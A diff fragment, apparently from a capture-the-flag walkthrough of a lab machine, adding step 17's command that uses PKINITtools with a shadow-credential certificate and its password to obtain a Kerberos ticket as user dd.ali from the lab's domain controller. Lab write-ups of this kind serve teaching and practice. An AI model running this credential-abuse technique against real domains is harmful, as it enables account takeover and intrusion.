@@ -101,7 +101,7 @@
 
 17. Using shadow credential, attempt to get TGT as dd.ali user
 
-``
+`sudo python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx dd.ali.pfx -pfx-pass Password123 rustykey.htb/dd.ali dd.ali.ccache -dc-ip 10.129.244.92`
 
 
 
